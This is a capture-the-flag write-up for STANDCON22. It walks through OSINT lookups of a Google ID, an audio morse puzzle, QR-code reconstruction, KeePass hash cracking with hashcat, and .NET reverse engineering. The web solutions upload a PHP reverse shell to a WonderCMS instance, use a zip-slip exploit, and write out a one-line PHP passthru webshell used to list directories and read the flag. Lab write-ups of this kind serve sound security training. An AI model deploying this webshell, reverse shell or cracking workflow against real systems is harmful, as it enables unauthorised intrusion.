# Table of Content
- [OSINT](#osint)
  - [I Sea You](#i-sea-you-part-1)
  - [Trolley Trolling](#trolley-trolling)
- [Web](#web)
  - [A Fishy Site](a-fishy-site)
  - [Files can slip too](files-can-slip-too)
- [Misc](#misc)
  - [Atlan Safe P1](#Atlan-Safe-P1)

# OSINT
## I Sea You Part 1
![osint category](https://img.shields.io/badge/category-osint-lightgrey.svg)
![score](https://img.shields.io/badge/score-69-blue.svg)
![solves](https://img.shields.io/badge/solves-80-brightgreen.svg)

### Description
After the golden crown was stolen, our team of operatives intercepted unusual sea-radio waves coming from our stronghold. We suspect that there is a double-agent that helped Atlantis steal the crown!

Your Mission: Intercept the message and make contact with the double-agent

**Hints**
1. Examine the email you recieved really closely. Like seriously. Closely. (digital sympathetic ink?) From there, it's just Google-Fu.

2. It seems the Agent has left a review on Google Maps. Search up on how you can view information further using his GAIA ID? MORE GOOGLE-FU!

### Files
1. [intercepted-audio-sea-waves.zip](files/intercepted-audio-sea-waves.zip)

### Solution
We are first presented with a zip file containing an audio file which is basically [The Little Mermaid - Under the Sea](https://www.youtube.com/watch?v=GC_mV1IpjWA).

However, opening the audio file in Audacity reveals the audio clips in the file.
![](images/Pasted%20image%2020220619175741.png)

But specifically the 7th and the 8th at the bottom seems rather suspicious with most of the remaining playtime being empty or silent but playing in the middle of the audio playtime.

We can maybe isolate this channel by clicking on the `Solo` button beside the channel and left click anywhere near the start of the suspicious audio.
![](images/Pasted%20image%2020220619180032.png)
*Channel 7 and 8 are the same audio.*

And playing it reveals a rather familiar sound - known as morse code. So, I decided to extract out this portion by simply highlighting this audio portion and COPY + PASTE onto another empty Audacity window.

Afterwards I saved it as an audio file by exporting it.

Then, through some googling, I found this useful [morse code audio decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html). Uploading the audio file and playing it reveals the secret message that Orca wants to say.

*Note - you may want to mute the chrome audio - since the beeping sound is pretty painful to listen through*
![](images/Pasted%20image%2020220618130724.png)

Given following message and the end goal which was to make contact.
```
CHANNEL COMPROMISED. EMAIL ORCA.ATLANTIS@GMAIL.COM.
```

We fired up an email message to `Agent Orca`. And soon enough, he responded with the first part of the flag.
![](images/Pasted%20image%2020220618131340.png)

From here, if one were to "accidentally" `CTRL+A` on the chrome tab or highlight the email sent over. It actually reveals the hidden text right below. It also suggest that he probably left some reviews on a website or even on Google-related platforms.
![](images/Pasted%20image%2020220619181022.png)

#### Flag 1
```
STANDCON22{Y0u_F0uNd_0r
```

Let's side track a little, although I did it using the highlight method, I felt the intended solution for this part was supposed to be using the `More` or the 3-dot button beside the email message then `Show original` which would also reveal the hidden text.
![](images/Pasted%20image%2020220619181452.png)
![](images/Pasted%20image%2020220619181343.png)

Now, back to the challenge. So, from here, we can do a little OSINT attack on Orca. Here is a [resource](https://medium.com/week-in-osint/keeping-a-grip-on-googleids-506814ae098b) I refered to while doing this challenge.

From the resource, we are basically able to obtain the google user ID of our target, Orca. And with the user ID we can do interesting things with it but specifically to see the reviews that he may have left on google platform.

So, I simply followed the steps in the resource to obtain the ID which is `115760377201113977336`
![](images/Pasted%20image%2020220618151023.png)

From here on, we just need to pluck the UID into the google URL for google reviews. Which is in the format of `https://www.google.com/maps/contrib/{userID}`.

As such, accessing `https://www.google.com/maps/contrib/115760377201113977336` reveals the review left by our `Agent Orca` giving us the second part of the flag.

![](images/Pasted%20image%2020220618150041.png)

#### Flag 2
```
C@'s_SEA_cR3t!}
```

### Final Flag
```
STANDCON22{Y0u_F0uNd_0rC@'s_SEA_cR3t!}
```

## Trolley Trolling
![osint category](https://img.shields.io/badge/category-osint-lightgrey.svg)
![score](https://img.shields.io/badge/score-243-blue.svg)
![solves](https://img.shields.io/badge/solves-77-brightgreen.svg)

### Description
The thief needed to make a quick getaway, but he left his loot where he could come back for it later, though he never did.

If you manage to find it, the flag is STANDCON22{text_on_box}. Replace any spaces or punctuation with an underscore "_".

### Solution
Using the Hint that was given for free, we can narrow down to the carpark near Vivocity
![](images/Pasted%20image%2020220717144047.png)

And viewing it in the `Satellite` view, we can see that the carpark is the correct one.
![](images/Pasted%20image%2020220618132300.png)
And changing the date of the Google maps, allows us to find the trolley with the words `NIPPON PAINT`
![](images/Pasted%20image%2020220618135917.png)

![](images/Pasted%20image%2020220618135904.png)

### Flag
```
STANDCON22{NIPPON_PAINT}
```


# Web
## A Fishy Site

![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-297-blue.svg)
![solves](https://img.shields.io/badge/solves-19-brightgreen.svg)

### Description

You sail across the ocean looking for lost treasures. One night, you see lights coming out somewhere deep in the ocean. You decided to dive into the ocean towards the light....

**Please do not brute force passwords. It can be guessed.**

_**nc lab-2.ctf.standcon.n0h4ts.com 36021**_

**The above port will spawn an instance of your challenge please do not attack it.**

### Summary

Starting off, the site reveals just a really simple page with an image of probably their kingdom I suppose.
![](images/Pasted%20image%2020220618193318.png)

But, at the very bottom of the page, there was a login button which when clicked, leads us to the login url.
![](images/Pasted%20image%2020220618193417.png)

So, we would probably have to try to gain access through password. But, we were told that brute forcing wasn't the end-game. Back to the homepage, we do see a really "Atlantic" vibe sentence. Maybe one of them is the password, if not we could try using combinations of X-length.

Starting with length 1, which is just the word on it's own. We can use `cewl` to generate a wordlist for it.
![](images/Pasted%20image%2020220618193219.png)

Then, use the wordlist to test against the passwords. I have written a script below which helps which the checking of the passwords against the wordlist to see if any of them accesses it.

``` fishysite.py
import requests

wordlist = []

with open('testWordlist.txt') as f:
    content = f.read()

for i in content.split("\n"):
    data = {
        'password' : i.strip()
    }
    r = requests.post("http://lab-2.ctf.standcon.n0h4ts.com:42778/loginURL", data)
    # print(r.status_code)
    if r.status_code == 200:
        print("Password is", i)
        break
print("Now for next part")
```

Thankfully, it works without having to increment our word length for `cewl` generation, giving us the password `ocean`.

Accessing the portal with the password reveals `wonderCMS` being used. Googling on `wonderCMS exploit` reveals an authenticated RCE which is vulnerable in [wonderCMS 3.1.3](https://www.exploit-db.com/exploits/49155).
![](images/Pasted%20image%2020220618194020.png)

Although it doesn't specify the version here, I thought we could give it a shot.

As such, I uploaded my reverse shell code (in php) and modified the IP and PORT to my own address and listening port. The uploading of file is done through the `Settings` > `Files`.
![](images/Pasted%20image%2020220618194617.png)
![](images/Pasted%20image%2020220618194539.png)
You can get a copy of the reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell).

However, I realised that the exploit writeup was using plugins while mine was using files, so the url using for plugins doesn't really work. But the CMS does reveal the path of the file and since they are of the same version, the RCE on files should still exist on the application. Let's try to access it!
![](images/Pasted%20image%2020220618192844.png)

After clicking on the link corresponding to the upload shell, the browser accesses it allows us to get back a reverse shell!
![](images/Pasted%20image%2020220618192640.png)

And further exploring the filesystem reveals that the flag is found at `/var/www/html/flag.txt`. Just like that, the flag is ours!
![](images/Pasted%20image%2020220618192115.png)

### Flag
```
STANDCON22{L0ST_C1TY_TR34SUR3_1S_M1N3!}
```

## Files can slip too

![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-297-blue.svg)
![solves](https://img.shields.io/badge/solves-19-brightgreen.svg)

### Description
Files say a lot and can do a lot, but did you knew that files can slip too? Provided the surface is slippery enough.

_**nc lab-1.ctf.standcon.n0h4ts.com 47119**_

**The above port will spawn an instance of your challenge please do not attack it.**

### Solution

Searching up on the versions being used in the application, we can see that there is a vulnerability regarding zipslip (https://snyk.io/research/zip-slip-vulnerability)

And looking up on public exploits, we can find one at https://github.com/ptoomey3/evilarc/raw/master/evilarc.py

![](images/Pasted%20image%2020220619001827.png)

> Note this portion below, I forgot to document down but, basically it tries to enumerate the location of the flag file. Before reading it.

Simple one-liner webshell from [here](https://github.com/JohnTroony/php-webshells). Credits to [JohnTroony](https://github.com/JohnTroony).

So simply, `echo "<?php echo passthru($_GET['cmd']); ?>" > test.php`
Then using the php web shell, we can run commands  below to find the flag

`ls ../`

`ls ../../`

`ls ../../../`

`cat /flag_022dc5a58d33.txt`

*This is because the path of `../../../` is `/`*

### Flag
```
STANDCON22{uns4f3_z!p_3xtr4c7!0n_!5_4_r34l_d4ng3r}
```

# Misc
## Atlan Safe P1
![misc category](https://img.shields.io/badge/category-misc-lightgrey.svg)
![score](https://img.shields.io/badge/score-300-blue.svg)
![solves](https://img.shields.io/badge/solves-1-brightgreen.svg)

### Description
We found a safe from Atlantis. Sang Nila Utama’s crown must be inside it. Can you crack the safe?

**Hints**
1. you rock you rock

### Files
1. [Atlan.7z](files/Atlan.7z)
2. [AtlanSafe.7z](files/AtlanSafe.7z)
3. [image.gif](files/image.gif)


### Solution

For this challenge, we given the a `.gif` file with 2 password-protected zips.

As such, I went straight to take look at the `image.gif` for potentially any leads to unlock those files.

Taking a look at the `image.gif`, it seems to contain a series of QR codes, some of which were in different QR-code sizes.

![](images/Pasted%20image%2020220619183333.png)
![](images/Pasted%20image%2020220619183355.png)

Before worrying about the QR-code sizes, let's try to extract out the frames of the gif file. We can do this by using the following command through `ffmpeg`
```
ffmpeg -i ../image.gif image-%d.png
```

This would save the seperate frames of QR codes into `image-%d.png` where `%d` is placeholder for the image number.

Once, we have the still QR code images, it's time to worry about how to scan different sizes of QR code. For my case, I decided to script in python which I am comfortable with.

While googling on how to read from QR codes using python, I came across this [article](https://towardsdatascience.com/create-and-read-qr-code-using-python-9fc73376a8f9) which proved to be essential to solve this initial challenge. So I followed the code under the "Reading QR Code" section and tried to read the contents of each QR code.

Also, I was quite thankful there was no need to worry about the different sizes in QR code as it was all able to be read into data. Below is the initial script I used to check the contents.

```initialScript.py
import cv2, os
from natsort import natsorted

cwd = os.path.dirname(os.path.realpath(__file__))

content1 = ""
content2 = ""
for frameFilename in natsorted(os.listdir(f"{cwd}/frames/")):
    print(frameFilename)
    img=cv2.imread(f"{cwd}/frames/{frameFilename}")
    det=cv2.QRCodeDetector()
    val, pts, st_code=det.detectAndDecode(img)
    content1 += val
    content2 += val + "\n"
print("Content 1", content1)
print("Content 2", content2)
```

For `content1` it is meant to contain the data in a line - perhaps if it is in binary. While `content2` was for stacking.

Running, the script reveals that actually there was another QR code in there! Really QR-codeception!
```                                                                                                                                                                                                                                                                                
...
Content 2                                                                   



        ##############      ##  ##    ##    ##############        
        ##          ##  ##  ##    ##  ####  ##          ##        
        ##  ######  ##          ##    ##    ##  ######  ##        
        ##  ######  ##  ######  ##    ##    ##  ######  ##        
        ##  ######  ##    ##        ####    ##  ######  ##        
        ##          ##  ####  ######        ##          ##        
        ##############  ##  ##  ##  ##  ##  ##############        
                          ######  ##                              
        ##########  ########  ##      ######  ##  ##  ##          
        ######  ####    ##  ##  ######    ##  ####  ####          
        ######    ####      ##      ######      ####    ##        
          ##  ##  ##    ##      ##  ##  ##  ####  ##    ##        
        ######      ##    ####  ####  ##  ####        ##          
        ##    ##  ##  ##  ##      ##    ######                    
        ##          ######    ####    ##  ########  ##  ##        
        ##  ####  ##      ##  ##      ##    ##  ##    ####        
        ##          ##  ##    ##  ##################              
                        ####    ##    ####      ####  ##          
        ##############  ##              ##  ##  ####              
        ##          ##          ##  ######      ######  ##        
        ##  ######  ##  ######  ##      ##############  ##        
        ##  ######  ##  ##          ######  ##  ##    ####        
        ##  ######  ##  ##  ######      ##      ##  ##  ##        
        ##          ##  ####  ##        ##########                
        ##############  ####  ####        ######        ##        





```

But, this wasn't able to be detected as QR code, which is expected but I tried, I wanted an easy way out for this :(.

Anyways, I went back to scripting and came back with a script to convert the hashes into pixels of `(255, 255, 255)` and spaces into pixels of `(0, 0, 0)` before writing into an image file.

As such, this was the final script
```generateSecretQR.py
import cv2, os
from natsort import natsorted
from PIL import Image

cwd = os.path.dirname(os.path.realpath(__file__))

content = ""
lines = []
for frameFilename in natsorted(os.listdir(f"{cwd}/frames/")):
    print(frameFilename)
    img=cv2.imread(f"{cwd}/frames/{frameFilename}")
    det=cv2.QRCodeDetector()
    val, pts, st_code=det.detectAndDecode(img)
    if val.strip() == "":
        continue
    content += val + "\n"
    lines.append(val)


print(content)
print(lines)

# Trying to craft a new QR image. From the lines generated from the frames.
width = 66 # All data from the QRs are length of 66.
height = 25

img = Image.new(mode = "RGB", size = (width, height))

for i in range(0, height):
    for j in range(0, width):
        # IMPORTANT - WIDTH COMES FIRST.
        # White if space.
        if lines[i][j] == " ":
            img.putpixel((j, i), (0, 0, 0))
        else:
            img.putpixel((j, i), (255, 255, 255))
img = img.resize((100, 100))
img.save(f"{cwd}/secretQR.jpg")

exit()
```

Basically, this script uses the `PILLOW` python API to first generate an image of the given width and height. Then based, on our extracted data, we fill the pixels one by one where ` ` is black and `#` is white. Then finally, do a little resize before writing into `secretQR.jpg`.

Now, all that's left is to read the data from the image. And, yes you might be thinking why didn't I just use the same method I used to read from the QR code initially. I did, and unfortunately it didn't output anything - possibly due to the quality and resolution.

However, I went online and searched for another tool that maybe I could check my sanity with and found [this](https://products.aspose.app/barcode/recognize). Basically trying out some of the options, but specifically "Excellent" with "QR Code" does the job.
![](images/Pasted%20image%2020220619190523.png)

And voila it throws us back the data from the image. Which seems to be a really complex key.
![](images/Pasted%20image%2020220619190617.png)


Now, we have obtained the key and we can try to check out the zip files using the following as the password.
```
230K-YUI9-3XDE-R97Z-5X3D-L4E8
```

Unfortunately, one of the zip files were unable to be unzipped, due to invalid password. Suggesting that the way into the `AtlanSafe.7z` must be through the contents in `Atlan.7z`.

So viewing the contents of `Atlan.7z` reveals a KeePass Password Database file (`.kdbx`). From here, I tried using the same key - hoping it might be a password reuse. But it didn't suggesting that maybe 1, I might have to brute force the password using a wordlist or 2, I may have missed something.

I decided to jump straight to password cracking first using `hashcat`.

But we need to first obtain the hash.  We can do that using `keepass2john Atlan.kdbx > hash.txt`. Assuming, the use of `hashcat`, remove the `Atlan:` from the `hash.txt` file before using.

![](images/Pasted%20image%2020220619191527.png)

Once the hash has been generated and kept into our hash file. We can make use of `hashcat` (on host machine), to crack the keepass hash.

We can simply run `hashcat` to crack keepass hashes with the following command
```
hashcat -m 13400 -a 0 -w 1 hashes.txt D:\Tools\Wordlists\rockyou.txt

# -m  refers to the target hash type. i.e. 13400 for the respective keepass hash we are cracking.
```
*For more information on the corresponding values for the hash types run `hashcat -h` or from [here](https://hashcat.net/wiki/doku.php?id=example_hashes)*

And, we can grab some popcorn and chill from here. However, when it was done, I realised that it didn't crack it...
![](images/Pasted%20image%2020220619192227.png)

So, I thought maybe the wordlist was too small or too common in CTFs. Since having passwords already found in the `rockyou.txt` may not be as interesting.

*Turns out, I just had an outdated `rockyou.txt`*

This time round, I changed and used another [wordlist](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm) from crackstation (the smaller one) that I had downloaded a few years back.
![](images/Pasted%20image%2020220619023549.png)

With that, we have the password for the keepass file - `b503290174`.

Let's try opening it up with the password found. We can open the keepass file using `keepassx` on Kali Linux and providing the password when prompted.
![](images/Pasted%20image%2020220620114202.png)

And...we are in. We have successfully gotten in with the cracked password.
![](images/Pasted%20image%2020220620114315.png)

Exploring through the secrets in there revealed mostly just non-relevant and "rick-roll" information and credentials. Except for the  `safe` entry found under "General".

![](images/Pasted%20image%2020220619034332.png)

This reveals the password for the `safe`  or rather the `AtlanSafe.7z` to be `7oZJttTgfkmAfpVTLNdd`.

Using the password from above to unzip the `AtlanSafe.7z` gives us an executable file - `ATLAN Safe.exe`
![](images/Pasted%20image%2020220620115512.png)

Running it reveals a "login" prompt for the PIN.
*Usually, we shouldn't just run executables we find but, this a CTF so it should be fine.*
![](images/Pasted%20image%2020220620115943.png)

Trying out with `000000` shows us the error message that isn't of much help - basically telling us that the PIN is wrong, try again.
![](images/Pasted%20image%2020220620120044.png)

From here, we are most likely supposed to Reverse Engineering the program and since it was a windows application, I tried firing up a tool called `dnSpy` (you can find it [here](https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8)). And opening it up the file in `dnSpy` successfully shows us the decompiled program in C# code.
![](images/Pasted%20image%2020220620120752.png)

Focusing on the PIN section,
![](images/Pasted%20image%2020220620121058.png)

We can see that there is a check if the PIN is `7689`, if not it triggers the wrong PIN error message.

Trying the PIN out on the executable brings us to the next step and then clicking on `Execute` opens up another prompt.
![](images/Pasted%20image%2020220620125144.png)

This time, we are require to provide the username to login with. Going back to `dnSpy`, under the `LoginUser` part.
![](images/Pasted%20image%2020220620125306.png)

We can actually see that a check is being done against `rvizx9`, and if this passes, it goes on to prompt for the password under `LoginPass`. So, our username must be `rvizx9`.

And expectedly, we are prompted with the password prompt after giving the username.
![](images/Pasted%20image%2020220620125701.png)

So, once again, back to `dnSpy`, focusing on the `LoginPass`.
![](images/Pasted%20image%2020220619030206.png)

We can now see that this time, it isn't in plain text but rather hashed like most passwords when going through checking. So, our main goal here is provide a password whose md5 hash is `532109e0eba9ef0279b6cccfca6c6c03`.

*From here, I was quite tired already so I just threw it into crackstation instead of using hashcat which would probably take time*
![](images/Pasted%20image%2020220619030250.png)

And with that, we have the final puzzle piece! The final password for the user is `!#udamnHACKER#!`.

Finally, entering the password reveals the `TOP-SECRET` with empty text in the textbox. And although, I think this part was supposed to through the RE process as there was function for this in the `Config` code, but I was randomly pressing on the `<TOP-SECRET>` text and it triggered the showing of text.

And scrolling down, we have the flag in clear text!

![](images/Pasted%20image%2020220619025932.png)

Credentials/Passwords in this challenge
```
Atlan.7z - 230K-YUI9-3XDE-R97Z-5X3D-L4E8
KeePass DB - b503290174
AtlanSafe.7z - 7oZJttTgfkmAfpVTLNdd
PIN - 7689
user - rvizx9
password - !#udamnHACKER#!
```

### Flag
```
STANDCON22{cr4ck3d_th3_sup3r_s3cur3d_4tl4n_s4f3_0x34PEIOVKO23XZRVPJQLER}
```
